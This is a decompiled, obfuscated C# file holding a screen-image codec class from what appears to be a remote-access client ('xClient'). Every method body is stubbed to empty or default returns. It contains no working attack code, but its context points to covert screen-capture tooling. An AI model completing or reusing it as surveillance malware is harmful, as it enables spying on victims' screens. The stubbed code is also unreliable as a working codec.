using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.Compression;

namespace xClient.Core.Utilities;

public class UnsafeStreamCodec : IDisposable
{
	private int _imageQuality;

	private byte[] _encodeBuffer;

	private Bitmap _decodedBitmap;

	private PixelFormat _encodedFormat;

	private int _encodedWidth;

	private int _encodedHeight;

	private readonly object _imageProcessLock;

	private JpgCompression _jpgCompression;

	private static UnsafeStreamCodec y4gXARpWuAZP3CIm8N3;

	public int Monitor
	{
		[CompilerGenerated]
		get
		{
			return 0;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public string Resolution
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public Size CheckBlock
	{
		[CompilerGenerated]
		get
		{
			return (Size)(object)null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public int ImageQuality
	{
		get
		{
			return 0;
		}
		private set
		{
		}
	}

	public UnsafeStreamCodec(int imageQuality, int monitor, string resolution)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	public void CodeImage(IntPtr scan0, Rectangle scanArea, Size imageSize, PixelFormat format, Stream outStream)
	{
	}

	public Bitmap DecodeData(IntPtr codecBuffer, uint length)
	{
		return null;
	}

	public Bitmap DecodeData(Stream inStream)
	{
		return null;
	}

	static UnsafeStreamCodec()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		Wi6cmkVc7dHeygudqqo();
	}

	internal static bool O4XyANp6Vl1fI9HdyHY()
	{
		return true;
	}

	internal static UnsafeStreamCodec JOfxXYpmb1in5XoV5qU()
	{
		return null;
	}

	internal static void EkBwnApJsZk7jX46vgS(object object_0)
	{
	}

	internal static void b6gJvVpqy2Wvn9OYQ3B(object object_0)
	{
	}

	internal static void zGsF3IpNBcAtj2gLQRr()
	{
	}

	internal static void JsR1mipZRtow2vV19y9()
	{
	}

	internal static void IvlwZap38IjM0HBIJKb(object object_0, bool disposing)
	{
	}

	internal static void lgpK97prR6qaw8e6dkP(object object_0)
	{
	}

	internal static object hs5FeXpeYw8chhdQH2g(int int_0)
	{
		return null;
	}

	internal static void Ask9u9pOQNgUc51cN17(object object_0)
	{
	}

	internal static object cBMyKhp0cwrhHJorDSC(int int_0)
	{
		return null;
	}

	internal static void TQ6I1ipdZ8AARUPbYcd(object object_0, object object_1, int int_0, int int_1)
	{
	}

	internal static long hqY2A6pE4id9SafM567(object object_0)
	{
		return 0L;
	}

	internal static int OBSjwfphcX1s1G0FRQj(object object_0)
	{
		return 0;
	}

	internal static int uMSO4npMr5AXamMGmHX(object object_0)
	{
		return 0;
	}

	internal static int dQYuWfpC2ZHRx8JZAol(object object_0)
	{
		return 0;
	}

	internal static PixelFormat MnTQ6kpQ4vqQlmjxdrh(object object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return (PixelFormat)(object)null;
	}

	internal static object po7S55pAkpWH2CaXTrg(object object_0, Rectangle rectangle_0, ImageLockMode imageLockMode_0, PixelFormat pixelFormat_0)
	{
		return null;
	}

	internal static long wDyre5pyge5W1vc0fIW(object object_0)
	{
		return 0L;
	}

	internal static void QgHd61pDebACRT4Vy85(object object_0, long long_0)
	{
	}

	internal static void Py8A8Wp8sa5xGRnPa91(object object_0, object object_1)
	{
	}

	internal static void vWyMXnp9E4VJ3gVSaai(object object_0)
	{
	}

	internal static object oSGAqqpXEqKYLRKQeIb(object object_0)
	{
		return null;
	}

	internal static int koRcU7pzghG9EPqE1FM(object object_0, object object_1, int int_0, int int_1)
	{
		return 0;
	}

	internal static int pCiJ7VVtmyaMNNUCo9D(object object_0, int int_0)
	{
		return 0;
	}

	internal static void jLUIAOVxQT8FsQwqSS9(object object_0, object object_1, Point point_0)
	{
	}

	internal static void Wi6cmkVc7dHeygudqqo()
	{
	}
}
